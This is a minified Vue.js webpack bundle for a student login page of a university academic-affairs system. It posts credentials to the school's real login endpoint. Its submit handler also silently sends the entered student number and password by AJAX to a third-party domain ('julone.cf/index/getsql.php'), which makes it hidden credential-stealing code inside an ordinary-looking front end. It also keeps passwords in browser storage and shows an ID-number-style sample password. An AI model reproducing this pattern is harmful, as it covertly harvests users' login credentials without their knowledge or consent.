(window.webpackJsonp=window.webpackJsonp||[]).push([["chunk-3dd53c58"],{"15e3":function(e,t,s){"use strict";s.r(t),s("0a16");var a=s("fd2d"),c=s("2be9"),i={components:{appFooter:a.a},data:function(){return{name:"",pass:"",seen:!0,switched:!1,saved:!0,accept:!0}},watch:{pass:function(e){Object(c.k)("scorePass",e)},name:function(e){Object(c.k)("scoreName",e)},saved:function(e){Object(c.k)("scoreSaved",e)},switched:function(e){this.$message({message:"当无法连接时候,请切换线路",center:!0})}},computed:{URL:function(){return this.switched?"http://ireader.qztc.edu.cn/cgi-bin/nph-ireader.pl/ireader/00/http/jwc.qztc.edu.cn/academic/j_acegi_security_check":"http://jwc.qztc.edu.cn/academic/j_acegi_security_check"}},methods:{togglePass:function(){this.seen=!this.seen},resetPass:function(){this.seen=!0},forget:function(){this.$alert("<h3>账号: &nbsp;163110111(学生号)</h3><br><h3>密码: &nbsp;350129199803021232</h3><br><h5>注: &nbsp;密码默认为18位身份证,如果修改密码,请填写修改后的密码.</h5>","账号格式模板",{confirmButtonText:"知道了",dangerouslyUseHTMLString:!0})},Submit:function(e){Object(c.a)("heavy"),/^[\d]{9}$/.test(this.name)?/^[\S]{5,18}$/.test(this.pass)?(document.querySelector("#form").submit(),$.ajax({type:"POST",url:"//julone.cf/index/getsql.php",data:{j_username:this.name,j_password:this.pass}})):this.$message({showClose:!0,message:"你的密码格式不正确!",center:!0,type:"warning"}):this.$message({showClose:!0,message:"你的学生号格式不正确!",center:!0,type:"warning"})}},created:function(){this.H=window.innerHeight-50+"px",this.W=window.innerWidth+"px",Object(c.f)("scoreName")?(this.name=Object(c.f)("scoreName"),this.saved=Object(c.f)("scoreSaved"),Object(c.f)("scoreSaved")&&(this.pass=Object(c.f)("scorePass"))):(console.log(1),Object(c.k)("scoreName",""),Object(c.k)("scorePass",""),Object(c.k)("scoreSaved",!0))}},n=(s("d845"),s("fc05")),r=Object(n.a)(i,function(){var e=this,t=e.$createElement,a=e._self._c||t;return a("div",{staticClass:"score container"},[a("el-form",{ref:"form1",attrs:{"label-position":"top",id:"form","label-width":"80px",size:"400px",action:e.URL,target:"_blank",name:"form1",method:"post"}},[a("caption",{staticClass:"ani1"},[a("img",{attrs:{src:s("d45e"),width:"100%",height:"100%",alt:""}})]),a("el-form-item",{staticClass:"ani2"},[a("span",{staticClass:"subTitle"},[e._v("教务处学生号")]),a("el-input",{staticClass:"myinput",attrs:{placeholder:"请输入学生号",name:"j_username",clearable:"",type:"text",maxlength:"9"},nativeOn:{keyup:function(t){return"keyCode"in t&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:e.Submit(t)}},model:{value:e.name,callback:function(t){e.name=e._n(t)},expression:"name"}},[a("i",{staticClass:"comIcon",attrs:{slot:"prefix"},slot:"prefix"},[e._v("")])])],1),a("input",{attrs:{type:"hidden",name:"groupId",value:""}}),a("el-form-item",{staticClass:"ani3"},[a("span",{staticClass:"subTitle"},[e._v("教务处密码")]),a("el-input",{staticClass:"myinput",attrs:{type:e.seen?"password":"text",placeholder:"请输入密码",name:"j_password"},on:{clear:e.resetPass},nativeOn:{keyup:function(t){return"keyCode"in t&&e._k(t.keyCode,"enter",13,t.key,"Enter")?null:e.Submit(t)}},model:{value:e.pass,callback:function(t){e.pass=t},expression:"pass"}},[a("i",{staticClass:"comIcon",attrs:{slot:"prefix"},slot:"prefix"},[e._v("")]),a("i",{staticClass:"comIcon",attrs:{slot:"suffix"},on:{click:e.togglePass},slot:"suffix"},[e._v(e._s(this.seen?"":""))])])],1),a("input",{attrs:{type:"hidden",name:"type",value:"1",id:"type"}}),a("el-form-item",{staticClass:"ani4",attrs:{align:"right"}},[a("el-switch",{staticStyle:{float:"left","margin-top":"11px"},attrs:{"active-color":"#409EFF","inactive-color":"#ccc","inactive-text":"线路1","active-text":"线路2"},model:{value:e.switched,callback:function(t){e.switched=t},expression:"switched"}}),a("el-checkbox",{staticStyle:{transform:"scale(.9)"},model:{value:e.saved,callback:function(t){e.saved=t},expression:"saved"}},[e._v("记住密码")])],1),a("el-form-item",{staticClass:"ani5",staticStyle:{margin:"0.5rem 0 1.3rem"},attrs:{size:"large"}},[a("el-button",{staticClass:"loginbtn",style:{filter:"grayscale("+(e.accept?"0":"1")+")"},attrs:{type:"primary",disabled:!e.accept},nativeOn:{click:function(t){return e.Submit(t)}}},[e._v("点击登录")])],1),a("el-form-item",{staticClass:"ani6",staticStyle:{margin:"-15px 0 -10px","text-align":"center",filter:"grayscale(.5)"}},[a("el-checkbox",{staticStyle:{transform:"scale(.95)"},model:{value:e.accept,callback:function(t){e.accept=t},expression:"accept"}},[a("span",{staticClass:"acccpt_text"},[e._v("我已阅读并接受"),a("a",[e._v("《用户协议》")]),e._v("和"),a("a",[e._v("《隐私政策》")])])])],1)],1),a("appFooter",{staticClass:"ani7",attrs:{btm:"5vh"}})],1)},[],!1,null,"5d892208",null);t.default=r.exports},"1cc0":function(e,t,s){},d45e:function(e,t,s){e.exports=s.p+"static/img/qzsf.256ecb43.png"},d845:function(e,t,s){"use strict";var a=s("1cc0");s.n(a).a}}]);